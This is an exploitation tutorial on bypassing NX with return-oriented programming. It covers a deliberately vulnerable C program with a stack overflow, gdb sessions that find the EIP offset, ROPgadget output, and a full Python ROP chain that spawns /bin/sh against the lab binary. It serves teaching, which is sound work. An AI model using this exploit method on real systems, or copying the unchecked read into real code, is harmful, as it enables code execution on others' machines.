## Bypassing NX - ROP
**Vulnerable Program**

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <stdint.h>
    #include <unistd.h>
    
    void vuln() {
        char buffer[128];
        char * second_buffer;
        uint32_t length = 0;
        puts("Reading from STDIN");
        read(0, buffer, 1024);
    
        if (strcmp(buffer, "Cool Input") == 0) {
            puts("What a cool string.");
        }
        length = strlen(buffer);
        if (length == 42) {
            puts("LUE");
        }
        second_buffer = malloc(length);
        strncpy(second_buffer, buffer, length);
    }
    
    int main() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
    
        puts("This is a big vulnerable example!");
        printf("I can print many things: %x, %s, %d\n", 0xdeadbeef, "Test String",
                42);
        write(1, "Writing to STDOUT\n", 18);
        vuln();
    }
**Compilation with nx flag**

    gcc -m32 -fno-stack-protector -static -znoexecstack -o nx_0 nx_0.c

**Checking Security**

    root@local:~/Desktop/NX# checksec nx_0
    [*] '/root/Desktop/NX/nx_0'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
**Controlling EIP**
I will not explain how to control eip here . read Smash The Stack for basic.

    root@local:~/Desktop/NX# gdb -q ./nx_0
    Reading symbols from ./nx_0...(no debugging symbols found)...done.
    gdb-peda$ pattern_create 200
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
    gdb-peda$ run
    Starting program: /root/Desktop/NX/nx_0
    This is a big vulnerable example!
    I can print many things: deadbeef, Test String, 42
    Writing to STDOUT
    Reading from STDIN
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
    
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x80e32e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\340\062\016", <incomplete sequence \311>)
    EBX: 0x41416d41 ('AmAA')
    ECX: 0x806af40 (<__strncpy_sse2+3584>:  movlpd QWORD PTR [edi],xmm0)
    EDX: 0x0
    ESI: 0x80df000 --> 0x0
    EDI: 0x80481f0 --> 0x0
    EBP: 0x6f414152 ('RAAo')
    ESP: 0xffffd610 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    EIP: 0x41534141 ('AASA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41534141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd610 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    0004| 0xffffd614 ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    0008| 0xffffd618 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    0012| 0xffffd61c ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    0016| 0xffffd620 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    0020| 0xffffd624 ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
    0024| 0xffffd628 ("AuAAXAAvAAYAAwAAZAAxAAyA\n")
    0028| 0xffffd62c ("XAAvAAYAAwAAZAAxAAyA\n")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41534141 in ?? ()
    gdb-peda$ Quit
    gdb-peda$ pattern_offset 0x41534141
    1095975233 found at offset: 148
    
Ok test

    root@local:~/Desktop/NX# python -c 'print "A"*148+"BBBB"+"C"*50' > payload_0.txtroot@local:~/Desktop/NX# gdb -q ./nx_0
    Reading symbols from ./nx_0...(no debugging symbols found)...done.
    gdb-peda$ r < payload_0.txt
    Starting program: /root/Desktop/NX/nx_0 < payload_0.txt
    This is a big vulnerable example!
    I can print many things: deadbeef, Test String, 42
    Writing to STDOUT
    Reading from STDIN
    
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x80e32e0 ('A' <repeats 128 times>, "\340\062\016", <incomplete sequence \313>)
    EBX: 0x41414141 ('AAAA')
    ECX: 0x806af60 (<__strncpy_sse2+3616>:  movlpd QWORD PTR [edi],xmm0)
    EDX: 0x0
    ESI: 0x80df000 --> 0x0
    EDI: 0x80481f0 --> 0x0
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd610 ('C' <repeats 50 times>, "\n")
    EIP: 0x42424242 ('BBBB')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x42424242
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd610 ('C' <repeats 50 times>, "\n")
    0004| 0xffffd614 ('C' <repeats 46 times>, "\n")
    0008| 0xffffd618 ('C' <repeats 42 times>, "\n")
    0012| 0xffffd61c ('C' <repeats 38 times>, "\n")
    0016| 0xffffd620 ('C' <repeats 34 times>, "\n")
    0020| 0xffffd624 ('C' <repeats 30 times>, "\n")
    0024| 0xffffd628 ('C' <repeats 26 times>, "\n")
    0028| 0xffffd62c ('C' <repeats 22 times>, "\n")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x42424242 in ?? ()
**Finding ROP Gadgets**
https://github.com/JonathanSalwan/ROPgadget

    ROPgadget --binary nx_0
    
it will find ropgadgets

    0x08078234 : xor esi, esi ; call 0x8049658
    0x080a6b61 : xor esi, esi ; mov eax, esi ; pop ebx ; pop esi ; pop edi ; ret
    0x0804fbe3 : xor esi, esi ; pop ebx ; mov eax, esi ; pop esi ; pop edi ; pop ebp ; ret
    0x0809671c : xor esi, esi ; ret 0xf01
    
    Unique gadgets found: 7843

**System calls**
If you already learned x86_ASM , you can understand how linux system call work. In this case we want to call execve to execute our new shell `execve('/bin/sh')` . 
Example

eax=0xb
ebx='/bin/sh'
ecx=0
edx=0

**Generating with ROPgadget**
Command 

    ROPgadget --binary nx_0 --ropchain
   
  It will generate ropchains automatically for `execve('bin/sh')`

    ROP chain generation
    ===========================================================
    
    - Step 1 -- Write-what-where gadgets
    
            [+] Gadget found: 0x8057c45 mov dword ptr [edx], eax ; ret
            [+] Gadget found: 0x80737cb pop edx ; ret
            [+] Gadget found: 0x80ad7c6 pop eax ; ret
            [+] Gadget found: 0x8057200 xor eax, eax ; ret
    
    - Step 2 -- Init syscall number gadgets
    
            [+] Gadget found: 0x8057200 xor eax, eax ; ret
            [+] Gadget found: 0x8080c6a inc eax ; ret
    
    - Step 3 -- Init syscall arguments gadgets
    
            [+] Gadget found: 0x8049021 pop ebx ; ret
            [+] Gadget found: 0x80737f2 pop ecx ; pop ebx ; ret
            [+] Gadget found: 0x80737cb pop edx ; ret
    
    - Step 4 -- Syscall gadget
    
            [+] Gadget found: 0x804a533 int 0x80
    
    - Step 5 -- Build the ROP chain
    
            #!/usr/bin/env python2
            # execve generated by ROPgadget
    
            from struct import pack
    
            # Padding goes here
            p = ''
    
            p += pack('<I', 0x080737cb) # pop edx ; ret
            p += pack('<I', 0x080df060) # @ .data
            p += pack('<I', 0x080ad7c6) # pop eax ; ret
            p += '/bin'
            p += pack('<I', 0x08057c45) # mov dword ptr [edx], eax ; ret
            p += pack('<I', 0x080737cb) # pop edx ; ret
            p += pack('<I', 0x080df064) # @ .data + 4
            p += pack('<I', 0x080ad7c6) # pop eax ; ret
            p += '//sh'
            p += pack('<I', 0x08057c45) # mov dword ptr [edx], eax ; ret
            p += pack('<I', 0x080737cb) # pop edx ; ret
            p += pack('<I', 0x080df068) # @ .data + 8
            p += pack('<I', 0x08057200) # xor eax, eax ; ret
            p += pack('<I', 0x08057c45) # mov dword ptr [edx], eax ; ret
            p += pack('<I', 0x08049021) # pop ebx ; ret
            p += pack('<I', 0x080df060) # @ .data
            p += pack('<I', 0x080737f2) # pop ecx ; pop ebx ; ret
            p += pack('<I', 0x080df068) # @ .data + 8
            p += pack('<I', 0x080df060) # padding without overwrite ebx
            p += pack('<I', 0x080737cb) # pop edx ; ret
            p += pack('<I', 0x080df068) # @ .data + 8
            p += pack('<I', 0x08057200) # xor eax, eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x08080c6a) # inc eax ; ret
            p += pack('<I', 0x0804a533) # int 0x80
**Final Exploit**

    from struct import pack
    
    p = ''
    p += pack('<I', 0x080737cb) # pop edx ; ret
    p += pack('<I', 0x080df060) # @ .data
    p += pack('<I', 0x080ad7c6) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x08057c45) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080737cb) # pop edx ; ret
    p += pack('<I', 0x080df064) # @ .data + 4
    p += pack('<I', 0x080ad7c6) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x08057c45) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080737cb) # pop edx ; ret
    p += pack('<I', 0x080df068) # @ .data + 8
    p += pack('<I', 0x08057200) # xor eax, eax ; ret
    p += pack('<I', 0x08057c45) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x08049021) # pop ebx ; ret
    p += pack('<I', 0x080df060) # @ .data
    p += pack('<I', 0x080737f2) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080df068) # @ .data + 8
    p += pack('<I', 0x080df060) # padding without overwrite ebx
    p += pack('<I', 0x080737cb) # pop edx ; ret
    p += pack('<I', 0x080df068) # @ .data + 8
    p += pack('<I', 0x08057200) # xor eax, eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x08080c6a) # inc eax ; ret
    p += pack('<I', 0x0804a533) # int 0x80
    
    payload="A"*148+p
    print payload
Test it

    root@local:~/Desktop/NX# python exploit_0.py > payload_1.txt
    root@local:~/Desktop/NX# cat payload_1.txt | ./nx_0
If you are not clear , try with gdb.

    root@local:~/Desktop/NX# gdb -q ./nx_0
    Reading symbols from ./nx_0...(no debugging symbols found)...done.
    gdb-peda$ r < payload_1.txt
    Starting program: /root/Desktop/NX/nx_0 < payload_1.txt
    This is a big vulnerable example!
    I can print many things: deadbeef, Test String, 42
    Writing to STDOUT
    Reading from STDIN
    process 19957 is executing new program: /bin/dash
    [Inferior 1 (process 19957) exited normally]
    Warning: not running or target is remote
We can see our payload have been spawned a new shell.

**Inspiration & Reading List**

http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Paper%20Payload%20already%20inside%20data%20reuse%20for%20ROP%20exploits.pdf


https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/6_bypass_nx_rop/lessonplan.md 
